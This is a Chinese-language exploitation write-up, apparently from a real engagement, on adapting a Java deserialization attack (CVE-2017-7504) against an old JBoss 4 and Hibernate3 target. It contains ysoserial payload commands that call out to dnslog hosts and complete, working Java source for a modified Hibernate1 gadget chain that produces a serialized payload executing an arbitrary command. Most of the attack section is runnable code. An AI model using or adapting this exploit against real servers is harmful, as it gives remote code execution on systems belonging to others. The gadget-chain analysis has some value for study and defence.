## **1、前沿**

在一次活动中意外发现目标一个偏远的资产使用了老版本的jboss，使用漏洞扫描工具发现目标存在反序列化漏洞组件，如图1.1所示。这个页面允许访问，基本上可以判断CVE-2017-7504的漏洞。

![](https://image.3001.net/images/20220928/1664343129_6333dc59862e1e28f8576.png!small)

图1.1 Jboss反序列化漏洞利用点

此漏洞的细节很简单，就是直接通过POST的方式向这个地址传输序列化之后的payload即可。为了方便，我们直接使用ysoserial来生成payload。

    
    
    java -jar ysoserial-0.0.6-SNAPSHOT-all.jar URLDNS "http://11.pzpfiy.dnslog.cn" > poc.ser

然后通过burp把生成的poc.ser发送给目标地址，如图1.2所示。

![](https://image.3001.net/images/20220928/1664343183_6333dc8f56de322057462.png!small)

图1.2 发送序列化的payload

查看DNSLOG的请求日志，可以看到payload利用成果，记录到dns请求日志，如图1.3所示。

![](https://image.3001.net/images/20220928/1664343209_6333dca90a89552aedb2d.png!small)

看起来一切都很正常，如果事情就这么简单的进行，也就没有写一篇文章的必要了。上面的payload只能记录dns请求，并不能执行系统命令。要执行系统命令，需要使用其他的利用链。网上有很多关于这个漏洞的exp和分析文章，基本上都是说的直接利用CommonsCollections利用链就可以成功了。

  

但是，实际情况是我把CC1-CC7都试了一遍，但是没有一条链可以利用成功。我们以网上文章中用的最多的CC5为例来说明整个过程。

    
    
    java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections5 "ping -n 1 22.pzpfiy.dnslog.cn" > poc.ser
    

然后与上面URLDNS利用链一样，发送生成的payload，结果是没有收到ping发送的dns请求，相当于命令没有执行成功。

难道说CommonsCollections包不是jboss默认就引用的吗？难道说低版本的jboss有一些奇怪的特性吗？

##  **2、探索**

怀着对漏洞探索的精神，从网上找了很久找到一个与目标相同版本的漏洞环境。通过一定的手段拿到了我想要的源码。查看jboss对应的目录结构，发现确实是存在默认引用的CommonsCollections包，如图2.1所示。

![](https://image.3001.net/images/20220928/1664343259_6333dcdb567917f4dfffe.png!small)

图2.1 Jboss中存在的CommonsCollections包

但是用ysoserial来测试发现仍然不能测试成功，最后发现低版本的jboss引用的CommonCollections不是3.x的版本，而是2.x的版本。如图2.2所示。

![](https://image.3001.net/images/20220928/1664343287_6333dcf7da2b56a9ea7a3.png!small)

图2.2 对比jboss和yso中的CommonCollections版本

这里可以看出jboss中引入的是CommonsCollections2.1的版本，而一般我们平时能利用的版本都是3.x。而2.1的版本中因为缺少一些CC链必须的组件而不能利用，如图2.3所示。

![](https://image.3001.net/images/20220928/1664343314_6333dd1202990ec07aeb1.png!small)

图2.3 CommonsCollections2.1包中缺少必要的functors相关类

那么还有没有其他利用链可以被利用的呢？接下来需要对比ysoserial提供的全部利用链和jboss中引入的jar包来看。

第一个我看到的是JBossInterceptors1利用链，从名字来看这条利用链是专门的jboss相关利用链，但是实际上在我们的环境中根本就没有找到这条链要用到的interceptor包中的类例如DefaultInvocationContextFactory，如图2.4所示。所以这条链用不通。

![](https://image.3001.net/images/20220928/1664343339_6333dd2b3f990b21c2fd6.png!small)

图2.4 目标环境中不存在DefaultInvocationContextFactory类

第二个我看到的是Hibernate1和Hibernate2，两条利用链关于hibernate中的部分是一样的，只是一个是通过JdbcRowSetImpl来触发，另一个是通过xalan来触发。我个人更喜欢xalan，所以直接通过Hibernate1利用链来调试。

Hibernate1利用链中主要分成makeGetter和makeCaller两个步骤。

在makeGetter中主要用到的类org.hibernate.property.BasicPropertyAccessor$BasicGetter在目标中也存在，我们就不过多赘述，有兴趣的小伙伴可以去翻看ysoserial的源码。主要来看makeCaller这步，因为这步中用到的多个类在目标的jboss环境都不存在，如图2.5、图2.6所示。

![](https://image.3001.net/images/20220928/1664343360_6333dd40b12f4d043bbe3.png!small)图2.5
ysoserial在makeCaller中用到的类

![](https://image.3001.net/images/20220928/1664343379_6333dd533ac654ca89e28.png!small)

图2.6 目标Jboss中不存在EntityEntityModeToTuplizerMapping类

所以我们直接利用ysoserial的Hibernate1利用链是不能成功的，但是仔细对Hibernate1利用链进行分析可以看出漏洞利用过程中的调用栈中并没有涉及到上述不存在的类，上述不存在的类主要用于设置一些类的属性字段，可以通过其他类来代替。

重写Hibernate1利用链，完整的代码如下所示。其中最主要的是修改了makeCaller中的部分逻辑。因为ysoserial在编写Hibernate1利用链时主要是用于Hibernate4以上版本。而我们目标是Hibernate3的版本。

    
    
    import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
    import org.hibernate.EntityMode;
    import org.hibernate.engine.TypedValue;
    import org.hibernate.tuple.AbstractComponentTuplizer;
    import org.hibernate.tuple.PojoComponentTuplizer;
    import org.hibernate.tuple.Tuplizer;
    import org.hibernate.tuple.TuplizerLookup;
    import org.hibernate.type.AbstractType;
    import org.hibernate.type.Type;
    import org.hibernate.type.ComponentType;
    
    import java.io.*;
    import java.lang.reflect.*;
    import java.util.HashMap;
    import java.util.Map;
    
    public class JbossOld {
        public static Object generatePayload() throws Exception {
            String command = "ping -n 1 22.v9t25u.dnslog.cn";
            Object tpl = Gadgets.createTemplatesImpl(command);
            TemplatesImpl tl = (TemplatesImpl) tpl;
            // tl.getOutputProperties();
    
            Object getters = makeGetter(tpl.getClass(), "getOutputProperties");
            return makeCaller(tpl, getters);
            //return null;
        }
    
        public static Object makeGetter ( Class<?> tplClass, String method ) throws Exception{
            Class<?> getterIf = Class.forName("org.hibernate.property.Getter");
            Class<?> basicGetter = Class.forName("org.hibernate.property.BasicPropertyAccessor$BasicGetter");
            Constructor<?> bgCon = basicGetter.getDeclaredConstructor(Class.class, Method.class, String.class);
            Reflections.setAccessible(bgCon);
    
            if ( !method.startsWith("get") ) {
                throw new IllegalArgumentException("Hibernate can only call getters");
            }
    
            String propName = Character.toLowerCase(method.charAt(3)) + method.substring(4);
    
            Object g = bgCon.newInstance(tplClass, tplClass.getDeclaredMethod(method), propName);
            Object arr = Array.newInstance(getterIf, 1);
            Array.set(arr, 0, g);
            return arr;
        }
        static Object makeCaller ( Object tpl, Object getters ) throws Exception {
            Class typedValueClass = Class.forName("org.hibernate.engine.TypedValue");
    
            PojoComponentTuplizer tup = Reflections.createWithoutConstructor(PojoComponentTuplizer.class);
            Reflections.getField(AbstractComponentTuplizer.class, "getters").set(tup, getters);
            Reflections.getField(AbstractComponentTuplizer.class, "propertySpan").set(tup, 1);
    
            ComponentType t = Reflections.createWithConstructor(ComponentType.class, AbstractType.class, new Class[0], new Object[0]);
            HashMap hm = new HashMap();
            hm.put(EntityMode.POJO, tup);
    
            Class<?> tlClazz = Class.forName("org.hibernate.tuple.TuplizerLookup");
            Constructor<?> tlCon = tlClazz.getDeclaredConstructor(Tuplizer.class, Tuplizer.class, Tuplizer.class);
            Reflections.setAccessible(tlCon);
            Object tuplizerLookup = tlCon.newInstance(null, null, null);
            Reflections.setFieldValue(tuplizerLookup, "pojoTuplizer", tup);
            Reflections.setFieldValue(t, "tuplizers", tuplizerLookup);
            Reflections.setFieldValue(t, "propertySpan", 1);
            Reflections.setFieldValue(t, "propertyTypes", new Type[] {
                    t
            });
            
            Constructor<?> typedValueConstructor = typedValueClass.getDeclaredConstructor(Type.class, Object.class, EntityMode.class);
            Object v1 = typedValueConstructor.newInstance(t, null, EntityMode.POJO);
            Reflections.setFieldValue(v1, "value", tpl);
            Reflections.setFieldValue(v1, "type", t);
    
            Object v2 = typedValueConstructor.newInstance(t, null, EntityMode.POJO);
            Reflections.setFieldValue(v2, "value", tpl);
            Reflections.setFieldValue(v2, "type", t);
    
            return Gadgets.makeMap(null, v2);
        }
        public static void main(String[] args) throws Exception {
             payload2File(generatePayload(),"test.ser");
             payloadTest("test.ser");
        }
        public static void payload2File(Object instance, String file)
                throws Exception {
            //将构造好的payload序列化后写入文件中
            ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(file));
            out.writeObject(instance);
            out.flush();
            out.close();
        }
        public static void payloadTest(String file) throws Exception {
            //读取写入的payload，并进行反序列化
            ObjectInputStream in = new ObjectInputStream(new FileInputStream(file));
            in.readObject();
            in.close();
        }
    }

调试反序列化利用链的代码是一个很麻烦的事情，有兴趣的小伙伴可以把我上面的代码去跟一下，其中主要用到的调用过程如下。其中标红部分都和传统Hibernate1利用链不一样。

java.util.HashMap readObject() --> org.hibernate.engine.TypedValue hashCode()
--> org.hibernate.type getHashCode() --> org.hibernate.type. ComponentType
getPropertyValues() --> org.hibernate.tuple. PojoComponentTuplizer
getPropertyValues() --> org.hibernate.tuple getPropertyValue() -->
org.hibernate.property get() -->
om.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl
getOutputProperties()

通过上面代码生成test.ser的payload文件，向目标地址发送对应的payload，如图2.7所示。

![](https://image.3001.net/images/20220928/1664343428_6333dd84ded01334e4f01.png!small)

图2.7 发送改进的Hibernate1利用链

然后在DNSLOG平台就可以看到由于ping命令导致的命令执行结果，如图2.8所示。这也就代表我们整个利用链调试成功。![](https://image.3001.net/images/20220928/1664343452_6333dd9c365a441314cc1.png!small)

##  **3、结论**

目前ysoserial中的Hibernate利用链是针对Hibernate4及以上版本，本文提出的主要是在实际工作中遇到的jboss4+hibernate3的解决方案。属于对原有ysoserial中反序列化利用链的优化。

[原文链接](https://mp.weixin.qq.com/s?__biz=MzkzNjMxNDM0Mg==&mid=2247485407&idx=1&sn=a87230bcdf9b24a7a15bc2d7385c030b&chksm=c2a1d356f5d65a403d7d0ca6ba29ef3334b7f10d48508258c696eba55e216b57e8c312c6fb3e&token=1181245865&lang=zh_CN#rd)

